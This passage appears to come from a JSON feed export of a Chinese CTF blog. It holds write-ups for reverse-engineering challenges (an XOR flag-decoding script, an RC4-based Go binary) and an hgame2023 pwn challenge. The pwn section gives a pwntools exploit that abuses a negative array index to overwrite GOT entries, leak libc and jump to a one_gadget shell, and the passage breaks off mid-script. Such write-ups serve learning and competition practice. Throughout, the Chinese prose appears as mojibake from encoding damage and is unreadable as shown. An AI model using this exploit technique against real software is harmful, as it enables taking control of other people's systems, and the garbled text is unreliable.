å¯†åçš„æ•°æ® v24 åˆé€’åŠ <br>\n<img data-src=\"/images/n12.png\" alt=\"image.png\"><br>\n æœ€åä¸€ä¸ªå­—ç¬¦æ²¡å˜å°±æ˜¯å¼‚æˆ– 0 äºæ˜¯å°±è¯•äº† 0-45 çš„å¼‚æˆ–æ¯”è¾ƒæ•°æ® ç›´æ¥å¾—å‡º flag</p>\n<h4 id=\"è„šæœ¬\"><a class=\"markdownIt-Anchor\" href=\"#è„šæœ¬\">#</a> è„šæœ¬</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>kkk<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token operator\">=</span>kkk</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    kkk<span class=\"token operator\">=</span>kkk<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#å› ä¸º lazyIDA æå–æ•°æ®çš„åŸå› å‰é¢å¼‚æˆ–ä¹‹åæ˜¯å€’åºåé¢å†å€’è¿‡æ¥</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''è¿è¡Œç»“æœ:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>46</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>[125, 33, 33, 33, 33, 33, 110, 117, 102, 95, 115, 105, 95, 116, 115, 117,</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>114, 95, 110, 105, 107, 99, 101, 104, 99, 95, 101, 115, 114, 101, 118, 101,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>114, 95, 121, 115, 97, 101, 123, 107, 110, 117, 112, 99, 101, 115]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>secpunk&#123;easy_reverse_checkin_rust_is_fun!!!!!&#125;</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Process finished with exit code 0</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>'''</pre></td></tr></table></figure><h2 id=\"n0th1ngg0\"><a class=\"markdownIt-Anchor\" href=\"#n0th1ngg0\">#</a> n0th1ngG0</h2>\n<h3 id=\"é¢˜ç›®åˆ†æ-2\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®åˆ†æ-2\">#</a> é¢˜ç›®åˆ†æ</h3>\n<p n1_jun10r_2023_1s_4w3s0m3>å¼€å§‹åšçš„æ—¶å€™é™„ä»¶å·²ç»æ›´æ–°è¿‡äº† ç›´æ¥ä¸‹è½½çš„ç®€å•ç‰ˆæœ¬<br>\nåŒæ—¶é¢˜ç›®æè¿°è¯´äº†å¦‚æœè®¤è¯†è¿™ä¸ªç®—æ³•å°±ç›´æ¥å†² æ¨æµ‹åº”è¯¥æ˜¯æŸç§åŠ å¯†ç®—æ³•<br>\n 2 ä¸ªç‰ˆæœ¬æˆ‘ç›´æ¥æŠŠ windows ç‰ˆæ”¾è¿› IDA<br>\n<img data-src=\"/images/n13.png\" alt=\"image.png\"><br>\n è¿™é‡Œæ³¨æ„ go è¯­è¨€é€†å‘é¢˜ main å‡½æ•°æ˜¯ main_main<br>\n<img data-src=\"/images/n14.png\" alt=\"image.png\"><br>\n å…³é”®å°±æ˜¯ä¸­é—´çš„ main_crypto_Crypt äº† è¿™é‡Œå‘ç°äº† 2 æ®µå¸¸é‡å­—ç¬¦æ•°ç»„ ä¸€æ®µä¸ºå¯†é’¥ä¸€æ®µä¸ºæ¯”è¾ƒæ•°æ®<br>\n<img data-src=\"/images/n15.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n16.png\" alt=\"image.png\"><br>\n ç‚¹å¼€æ˜¯ 2 ä¸ª WTF å‡½æ•°å……æ–¥ç€ RC4 ç®—æ³•çš„ç‰¹å¾ è¿™æ—¶å€™è¿˜æ²¡ç»†çœ‹ ç›´æ¥åŠ¨æ€è°ƒè¯•æå– key è¯•è¯•åŸç‰ˆ RC4 (æ„Ÿè§‰ä¸€èˆ¬ RC4 ä¸ä¼šé­”æ”¹å§)<br>\n<img data-src=\"/images/n17.png\" alt=\"image.png\"><br>\n å‰é¢å¯¹ key æœ‰ä¸ªå¾ªç¯å¤„ç†ä¸ç”¨ç®¡ ç›´æ¥æå–å¤„ç†åçš„ <strong>secpunk:</strong><br>\n<img data-src=\"/images/n18.png\" alt=\"image.png\"><br>\nRC4 ä¸ºå¯¹ç§°åŠ å¯† æŠŠæ¯”è¾ƒæ•°æ®è½¬æ¢ä¸º hex å­—ç¬¦ä¸²ç„¶å RC4 å°±èƒ½å¾—åˆ° flag<br>\n<img data-src=\"/images/n19.png\" alt=\"image.png\"><br>\nsecpunk</p>\n<p>æˆåŠŸ get flag</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "hgame2023 éƒ¨åˆ†åšé¢˜è®°å½•",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"hgame2023-éƒ¨åˆ†é¢˜è®°å½•\"><a class=\"markdownIt-Anchor\" href=\"#hgame2023-éƒ¨åˆ†é¢˜è®°å½•\">#</a> hgame2023 éƒ¨åˆ†é¢˜è®°å½•</h1>\n<p>åšçš„ä¸»è¦æ˜¯äºŒè¿›åˆ¶ æ‚é¡¹åšäº†ä¸€äº› ç„¶ååšäº†ä¸€é“ IOT æœ‰å…³ MQTT çš„ 50 åˆ†çš„é¢˜ ä¸€é“ web ç­¾åˆ°é¢˜ (æ‰“å¼€é¡µé¢æºç å°±æœ‰é‚£ç§)</p>\n<p>è®°å½•äº†ä¸€äº›ä¸ªäººè®¤ä¸ºéœ€è¦è®°å½•çš„é¢˜</p>\n<h2 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h2>\n<h3 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h3>\n<h4 id=\"choose_the_seat\"><a class=\"markdownIt-Anchor\" href=\"#choose_the_seat\">#</a> choose_the_seat</h4>\n<p><img data-src=\"/images/image-20230129183211218.png\" alt=\"image.png\"></p>\n<p>IDA ä¸­æŸ¥çœ‹ æ²¡æœ‰åé—¨å‡½æ•° æ²¡æœ‰ bin/sh å­—ç¬¦ä¸² è®¤ä¸ºå’Œ ret2libc æœ‰å…³å¯èƒ½è¦æ³„æ¼ got è¡¨</p>\n<p><img data-src=\"/images/image-20230129183939209.png\" alt=\"image.png\"></p>\n<p>æ£€æŸ¥ä¿æŠ¤ï¼Œåªå¼€äº† nx ä¿æŠ¤ (No-eXecute, ä¸å¯æ‰§è¡Œä¿æŠ¤ï¼‰ RELRO ä¸º Partial RELRO ä¹Ÿå°±æ˜¯è¯´ got è¡¨å¯ä»¥ä¿®æ”¹</p>\n<h5 id=\"relroä¿æŠ¤è¡¥å……\"><a class=\"markdownIt-Anchor\" href=\"#relroä¿æŠ¤è¡¥å……\">#</a> <strong>RELRO ä¿æŠ¤è¡¥å……</strong></h5>\n<p>åœ¨ Linux ä¸­æœ‰ä¸¤ç§ RELRO æ¨¡å¼ï¼š <code>Partial RELRO</code>  å’Œ  <code>Full RELRO</code> ã€‚Linux ä¸­ <code>Partical RELRO</code>  é»˜è®¤å¼€å¯ã€‚å¦‚æœå¼€å¯  <code>FUll RELRO</code> ï¼Œæ„å‘³ç€æˆ‘ä»¬æ— æ³•ä¿®æ”¹ got è¡¨ï¼Œè¿™æ ·ä¹Ÿå°±æ²¡æ³•é€šè¿‡ä¿®æ”¹ GOT è¡¨æ¥è¿›è¡Œ <strong>Return-to-libc</strong> æ”»å‡»</p>\n<p>hint æ˜¯æ•°ç»„è¶Šç•Œï¼Œé€šè¿‡æŸ¥æ‰¾èµ„æ–™å‘ç°</p>\n<h5 id=\"æ•°ç»„è¶Šç•Œ\"><a class=\"markdownIt-Anchor\" href=\"#æ•°ç»„è¶Šç•Œ\">#</a> æ•°ç»„è¶Šç•Œ</h5>\n<p>æ‰€è°“çš„æ•°ç»„è¶Šç•Œï¼Œç®€å•åœ°è®²å°±æ˜¯æŒ‡æ•°ç»„ä¸‹æ ‡å˜é‡çš„å–å€¼è¶…è¿‡äº†åˆå§‹å®šä¹‰æ—¶çš„å¤§å°ï¼Œå¯¼è‡´å¯¹æ•°ç»„å…ƒç´ çš„è®¿é—®å‡ºç°åœ¨æ•°ç»„çš„èŒƒå›´ä¹‹å¤–ï¼Œè¿™ç±»é”™è¯¯ä¹Ÿæ˜¯ C è¯­è¨€ç¨‹åºä¸­æœ€å¸¸è§çš„é”™è¯¯ä¹‹ä¸€ã€‚</p>\n<p>åœ¨ C è¯­è¨€ä¸­ï¼Œæ•°ç»„å¿…é¡»æ˜¯é™æ€çš„ã€‚æ¢è€Œè¨€ä¹‹ï¼Œæ•°ç»„çš„å¤§å°å¿…é¡»åœ¨ç¨‹åºè¿è¡Œå‰å°±ç¡®å®šä¸‹æ¥ã€‚ç”±äº C è¯­è¨€å¹¶ä¸å…·æœ‰ç±»ä¼¼ Java  ç­‰è¯­è¨€ä¸­ç°æœ‰çš„é™æ€åˆ†æå·¥å…·çš„åŠŸèƒ½ï¼Œå¯ä»¥å¯¹ç¨‹åºä¸­æ•°ç»„ä¸‹æ ‡å–å€¼èŒƒå›´è¿›è¡Œä¸¥æ ¼æ£€æŸ¥ï¼Œä¸€æ—¦å‘ç°æ•°ç»„ä¸Šæº¢æˆ–ä¸‹æº¢ï¼Œéƒ½ä¼šå› æŠ›å‡ºå¼‚å¸¸è€Œç»ˆæ­¢ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒC  è¯­è¨€å¹¶ä¸æ£€éªŒæ•°ç»„è¾¹ç•Œï¼Œæ•°ç»„çš„ä¸¤ç«¯éƒ½æœ‰å¯èƒ½è¶Šç•Œï¼Œä»è€Œä½¿å…¶ä»–å˜é‡çš„æ•°æ®ç”šè‡³ç¨‹åºä»£ç è¢«ç ´åã€‚</p>\n<p>æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„è¶Šç•Œæ¼æ´ï¼Œå°† got è¡¨é‡Œ printf å‡½æ•°çš„åœ°å€ä¿®æ”¹æˆ systemï¼ˆâ€˜/bin/shâ€™â€ï¼‰çš„åœ°å€ï¼Œé‚£ä¹ˆç¨‹åºåœ¨ä¹‹åè°ƒç”¨ printf å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯å‡½æ•° systemï¼ˆâ€˜/bin/shâ€™â€ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†ç›®æ ‡ä¸»æœºçš„æ§åˆ¶æƒé™ã€‚</p>\n<p><img data-src=\"/images/image-20230129192048928.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œæœ‰ä¸ª if (v0&gt;9) é€€å‡º è€Œè‹¥è¦æ•°ç»„è¶Šç•Œ v0==10 æ‰€ä»¥è€ƒè™‘ v0 ä¸ºè´Ÿæ•°äº§ç”Ÿè¶Šç•Œ</p>\n<p>seats æ˜¯å‚¨å­˜åœ¨ bss ä¸­ï¼Œå¯ä»¥åå‘è¶Šç•Œä¿®æ”¹ got è¡¨</p>\n<p>æ ¹æ® got è¡¨ä¸­çš„åç§»å¯ä»¥è®¡ç®—å‡ºç”¨åˆ°çš„ä¸‹æ ‡çš„å¤§å°</p>\n<p>æ³„æ¼ got è¡¨ ä¹‹å‰æˆ‘è¿˜æ²¡çœ‹åç§» çº¯åŠ¨æ€è°ƒè¯•â€¦ğŸ™</p>\n<p><img data-src=\"/images/image.png\" alt=\"image.png\"></p>\n<p>-10 ä¹‹å è¦†ç›–åˆ°è¿™é‡Œäº†ï¼ï¼ï¼</p>\n<p><img data-src=\"/images/123.png\" alt=\"image.png\"></p>\n<p>-9 è¦†ç›–åˆ° put</p>\n<p><strong>-7 æ˜¯ read</strong></p>\n<p><img data-src=\"/images/7778.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230130002855289.png\" alt=\"image.png\"></p>\n<p><strong>åç§»è®¡ç®—å¾— - 6 è¦†ç›–åˆ° exit é€€å‡ºå‡½æ•°</strong></p>\n<p>å¼€å§‹å†™ EXP</p>\n<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼šé€šè¿‡ä¿®æ”¹ exit å‡½æ•°çš„ got è¡¨ä¸º start è®©ç¨‹åºåå¤æ‰§è¡Œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#åå¤æ‰§è¡Œ</span></pre></td></tr></table></figure><p><strong>ç¬¬äºŒæ­¥</strong>ï¼šæ³„æ¼ read åœ°å€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#è®©åé¢çš„ puts æ³„éœ² read çœŸå®åœ°å€</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>p.send (bâ€™\\xc0â€™) æ˜¯å› ä¸ºç¨‹åºå¼€äº† <strong>aslr ä¿æŠ¤</strong>ï¼ˆæœ€åä¸‰ä½ä¸å˜ï¼‰åç§»ä¸å˜</p>\n<p>å¯æŸ¥çœ‹ got è¡¨æŸ¥çœ‹ read å‡½æ•°æœ€ååç§»å°±æ˜¯ c0 è¿™é‡Œæ²¡æœ‰ä¿®æ”¹ read å‡½æ•° ç›®çš„å°±æ˜¯æ³„æ¼</p>\n<p>æœ€åè¿™é‡Œç”¨äº† one_gadget å·¥å…·</p>\n<p><img data-src=\"/images/image-20230130005749259.png\" alt=\"image.png\"></p>\n<p>one_gadget å°±æ˜¯ç”¨æ¥å»æŸ¥æ‰¾åŠ¨æ€é“¾æ¥åº“é‡Œ execve (&quot;/bin/sh&quot;, rsp+0x70, environ) å‡½æ•°çš„åœ°å€çš„</p>\n<p>å› ä¸ºç¯å¢ƒé—®é¢˜è‹¥è¦æœ¬åœ°æ‰“é€šè‡ªå·±é…ç½®äº†ä¸€ä¸‹ libc å’Œ ld â€¦</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXPï¼š</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"konsole\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-e\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p = remote()</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.31.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p = remote(\"\",10000)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b* $rebase(0xadf)\")</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#åå¤æ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#è®©åé¢çš„ puts æ³„éœ² read çœŸå®åœ°å€</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc_base<span class=\"token operator\">=</span>read_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>one_gadget<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0xe3b04</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3afe</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>shell<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>one_gadget<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"name\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span><span class=\"token 